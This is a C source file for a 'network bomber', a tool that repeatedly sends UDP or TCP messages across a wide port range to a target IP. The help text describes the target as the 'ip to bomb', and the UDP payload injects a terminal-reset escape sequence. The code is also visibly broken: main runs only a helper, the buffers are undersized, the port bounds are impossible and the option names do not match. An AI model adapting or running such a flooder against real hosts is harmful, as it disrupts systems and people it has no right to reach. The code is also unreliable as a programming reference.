#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<unistd.h>
#include<pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/wait.h>
#include <pthread.h>
#include <sys/time.h>
#include <sys/resource.h>

#include "network_bomber.h"

#define DEFAULT_SLEEP 5
#define DEFAULT_PORT_MIN 0
#define DEFAULT_PORT_MAX 100000
#define DEFAULT_IP       "127.0.0.1"

#define TAILLE_MESSAGE 255
#define PORT           6666
#define IP             "10.6.7."

int*       g_sockets;
pthread_t* g_threads;

void(*g_pointer_handler)(void* p_ip);

int g_port = 0;

int g_trace = 0;

int g_port_min = DEFAULT_PORT_MIN;
int g_port_max = DEFAULT_PORT_MAX;

int g_sleep    = DEFAULT_SLEEP;

int g_count_ip = 1;

char g_ip     [15] = DEFAULT_IP;
char g_ip_min [15] = DEFAULT_IP;
char g_ip_max [15] = DEFAULT_IP;

char g_type   [15] = {'u', 'd', 'p', '\0'};

void* g_f;

char g_message[255];

void handler_udp(void* p_ip)
{
  int d_socket;

  //int a = *((int *) p_ip);
  int a = 12;
  struct sockaddr_in sockaddr_in_client;

  char buffer[TAILLE_MESSAGE];

  d_socket = socket(AF_INET, SOCK_DGRAM , 0);

  if(d_socket == -1)
  {
    perror("socket");
    exit(EXIT_FAILURE);
  }
  char buff_int[2];

  sprintf(buff_int, "%d", a);

  while(1)
  {
    sleep(g_sleep);

    for(int j = g_port_min; j <= g_port_max; j++)
    {
      if(g_trace == 1)
        fprintf(stdout, "%s : %d\n", g_ip, j);

      sockaddr_in_client.sin_addr.s_addr = inet_addr(g_ip);
      sockaddr_in_client.sin_family      = AF_INET;
      sockaddr_in_client.sin_port        = htons(j);

      if(d_socket == -1)
      {
        //perror("socket ");
        //exit(EXIT_FAILURE);
      }

      strcpy(buffer, "\033cYolo.\n");

      if(sendto(d_socket, buffer, strlen(buffer)
      , 0,
      (struct sockaddr*) &sockaddr_in_client, sizeof sockaddr_in_client) < 0)
      {
        perror("sendto : ");
        exit(1);
      }
    }
  }
}

void handler_tcp(void* ip)
{
  int d_socket;

  //int a = *((int *) p_ip);
  int a = 12;
  struct sockaddr_in sockaddr_in_client;

  char buffer[TAILLE_MESSAGE];

  d_socket = socket(AF_INET, SOCK_STREAM , 0);

  if(d_socket == -1)
  {
    perror("socket");
    exit(EXIT_FAILURE);
  }
  char buff_int[2];

  sprintf(buff_int, "%d", a);

  while(1)
  {
    sleep(g_sleep);
    for(int j = g_port_min; j <= g_port_max; j++)
    {
      sockaddr_in_client.sin_addr.s_addr = inet_addr(g_ip);
      sockaddr_in_client.sin_family      = AF_INET;
      sockaddr_in_client.sin_port        = htons(j);

      if(g_trace == 1)
        fprintf(stdout, "%s : %d\n", g_ip, j);


      if(connect(d_socket , (struct sockaddr*) &sockaddr_in_client , sizeof sockaddr_in_client) == 0)
      {
        if(fork() == 0)
        {
          g_port = j;
          fprintf(stdout, "Connected %s : %d\n", g_ip, g_port);
          while(1)
          {
            sleep(g_sleep);
            if(sendto(d_socket, g_message, strlen(g_message)
            , 0,
            (struct sockaddr*) &sockaddr_in_client, sizeof sockaddr_in_client) < 0)
            {
              perror("sendto : ");
              return;
            }
          }
        }
        }
      }
    }

}

void foo()
{
  g_threads = malloc(30 * sizeof(pthread_t));

  if(g_count_ip == 1)
    g_pointer_handler((void*) 1);
  else
    for(int index = 0; index < g_count_ip; index++)
    {
      int* i = malloc(1 * sizeof(int));
      pthread_create(&g_threads[index], NULL , handler_udp, (void*) i);

      pthread_join(g_threads[index], NULL);
    }
}

void init(int argc, char** argv)
{
  int c;
  int digit_optind = 0;
  int aopt = 0, bopt = 0;
  char *copt = 0, *dopt = 0;

  struct option long_options[] =
  {
    {"trace", 0, 0, 0},
    {"ports", 0, 0, 0},
    {"range", 0, 0, 0},
    {"help", 0, 0, 0},
    {"port_min", 1, 0, 0},
    {"port_max", 1, 0, 0},
    {NULL, 0, NULL, 0}
  };

  int option_index = 0;
  char* buffer;

  while ((c = getopt_long(argc, argv, "m:t:i:s:",
  long_options, &option_index)) != -1)
  {
    int this_option_optind = optind ? optind : 1;
    switch(c)
    {
      case 0:
        if(strcasecmp("trace", long_options[option_index].name) == 0)
          g_trace = 1;
        else if(strcasecmp("pmin", long_options[option_index].name) == 0)
          g_port_min = atoi(optarg);
        else if(strcasecmp("pmax", long_options[option_index].name) == 0)
          g_port_max = atoi(optarg);
        else if(strcasecmp("ipmin", long_options[option_index].name) == 0)
          strcpy(g_ip_min, optarg);
        else if(strcasecmp("ipmax", long_options[option_index].name) == 0)
          strcpy(g_ip_max, optarg);
        else if(strcasecmp("help", long_options[option_index].name) == 0)
          help();
        else
        {

        }
      break;

      case 'i':
        strcpy(g_ip, optarg);
        g_count_ip = 1;
      break;

      case 's':
        g_sleep = atoi(optarg);
      break;

      case 't':
        strcpy(g_type, optarg);
        if(strcasecmp(g_type, "udp") == 0)
          g_pointer_handler = handler_udp;
        else
          g_pointer_handler = handler_tcp;
      break;
      case 'm':
        strcpy(g_message, optarg);
      break;
      default:
        help();
      break;
    }
  }
}

void help()
{
  fprintf(stdout, "-i ip   : ip to bomb\n");
  fprintf(stdout, "-p port : port to bomb\n");
  fprintf(stdout, "-t type : udp (default) / tcp\n");
  fprintf(stdout, "-s sleep : Time to sleep between each message (5 default)\n");
  fprintf(stdout, "If you don't know the port to bomb\n");
  fprintf(stdout, "\t--pmin port_minimum : port minimum to scan (0 default)\n");
  fprintf(stdout, "\t--pmax port_maximum: port_maximum to scan  (100 000 default)\n");
  fprintf(stdout, "--trace : \n");
  fprintf(stdout, "\n");

  exit(1);
}



uint32_t getDecimalValueOfIPV4_String(const char* ipAddress)
{
    uint8_t ipbytes[4]={};
    int i =0;
    int8_t j=3;
    while (ipAddress+i && i<strlen(ipAddress))
    {
       char digit = ipAddress[i];
       if (isdigit(digit) == 0 && digit!='.'){
           return 0;
       }
        j=digit=='.'?j-1:j;
       ipbytes[j]= ipbytes[j]*10 + atoi(&digit);

        i++;
    }

    uint32_t a = ipbytes[0];
    uint32_t b =  ( uint32_t)ipbytes[1] << 8;
    uint32_t c =  ( uint32_t)ipbytes[2] << 16;
    uint32_t d =  ( uint32_t)ipbytes[3] << 24;
    return a+b+c+d;
}



void cut()
{
   const char s[1] = ".";
   char* token;

   /* get the first token */
   token = strtok(g_ip_min, s);

   /* walk through other tokens */
   while(token != NULL )
   {
      printf( " %s\n", token );

      token = strtok(NULL, s);
   }

   uint32_t t_ip_min = getDecimalValueOfIPV4_String(g_ip_min);

   uint32_t t_ip_max = getDecimalValueOfIPV4_String(g_ip_max);

   g_threads = malloc((t_ip_min - t_ip_max) * sizeof(pthread_t));
}

int main(int argc , char** argv)
{
  cut();
//  init(argc, argv);
//  foo();
}
